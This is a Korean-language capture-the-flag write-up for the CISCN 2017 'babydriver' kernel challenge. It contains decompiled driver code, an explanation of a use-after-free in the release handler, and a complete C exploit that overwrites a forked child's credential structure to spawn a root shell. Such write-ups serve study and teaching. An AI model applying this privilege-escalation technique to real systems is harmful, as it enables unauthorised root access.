---
title: CISCN 2017 - babydriver
categories:
 - pwnable
tags: kernel, uaf, tty
---

  

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점			
- Reference


진짜 parallels에서 별 생쇼를 다했지만 nested virtualize 지원이 안되는 것 같아서 고객센터에 문의해봤더니 pro 에디션만 가능하다고 답변이 왔다.. 진짜..

결국 vmware fusion으로 qemu enable-kvm 옵션이 되어있는 문제를 풀 수 있었다.. 진짜 너무 찾느라 너무 너무 힘들었다.. ㅠㅠ

자세한 세팅은 reference 사이트를 참고하면 되겠다.

# Introduction

*babydriver.ko*

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( (signed int)alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v1 >= 0 )
    {
      v2 = (class *)_class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}


void __cdecl babydriver_exit()
{
  device_destroy(babydev_class, babydev_no);
  class_destroy(babydev_class);
  cdev_del(&cdev_0);
  unregister_chrdev_region(babydev_no, 1LL);
}


ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t length_1; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > length_1 )
  {
    v6 = length_1;
    copy_to_user(buffer);                       // (buffer, babydev_struct.device_buf, length)
    result = v6;
  }
  return result;
}


ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();                           // (babydev_struct.device_buf, buffer, length)
    result = v6;
  }
  return result;
}


// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t input; // rdx
  size_t size; // rbx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  size = input;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(size, 0x24000C0LL);
    babydev_struct.device_buf_len = size;
    printk("alloc done\n");
    result = 0LL;
  }
  else
  {
    printk(&word_2EB);
    result = -22LL;
  }
  return result;
}


int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n");
  return 0;
}


int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}

```

# Vunlnerability

해당 문제에는 `smep`이 걸려있고 `kalsr`은 걸려있지 않다.

취약점은 `babyrelease`에서 발생하는데 `kfree`를 하고나서 `babydev_struct.device_buf` 변수에 대한 초기화를 시켜주지 않아서 해당 모듈에서 생성하는 device를 두번 열어서 `UAF` 취약점을 트리거 할 수 있게 된다.

# slv.c

  
```c
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/wait.h>

#define COMMAND 0x10001

void print(char* input){


  for (int i =0; i<0x4; i++){

    printf("%04d: ", i *0x10);

    for (int j =0; j<0x10; j++) printf("%02x ", input[i*0x10 + j] & 0xff);

    printf("| ");

    for (int j =0; j<0x10; j++) printf("%c", input[i*0x10 + j] & 0xff);

    printf("\n");
  }

  return;
}
int main(){

  pid_t pid;
  char input[1024];
  char zero[256]; 

  memset(zero, 0, sizeof(zero));
  int fd = open("/dev/babydev", O_RDWR);

  if (fd < 0){
    printf("[-] Error : (main) open('/dev/babydev')\n");
    exit(-1);
  }


  int fd2 = open("/dev/babydev", O_RDWR);

  if (fd2 < 0){
    printf("[-] Error : (main) open('/dev/babydev')\n");
    exit(-1);
  }

  ioctl(fd, COMMAND, 168);
  close(fd);

  pid = fork();


  if (pid < 0 ){
    printf("[-] Error : fork()\n");
    exit(-1);

  } else if(pid == 0){
    read(fd2, input, 128);
    
    print(input);

    write(fd2, zero, 28);

    sleep(1);

    if(getuid() != 0){
      printf("[-] Error : getuid() != 0\n");
      exit(-1);
    }

    system("/bin/sh");
    exit(0);

  }else{
    wait(0);
  }

  close(fd2);


  return 0;
}
```

부모 프로세스일때 `wait(0)`를 해주는 이유는 `system("/bin/sh")`를 실행하기 전에 디바이스를 닫아버리면서 `kfree`를 호출해 익스가 진행되지 않는것을 막기 위해서 넣는다.


++ `tty struct`를 이용한 익스 추가할 예정++


# 느낀 점

꾸준히 공부해야겠다.


# Reference

[https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/](https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/)
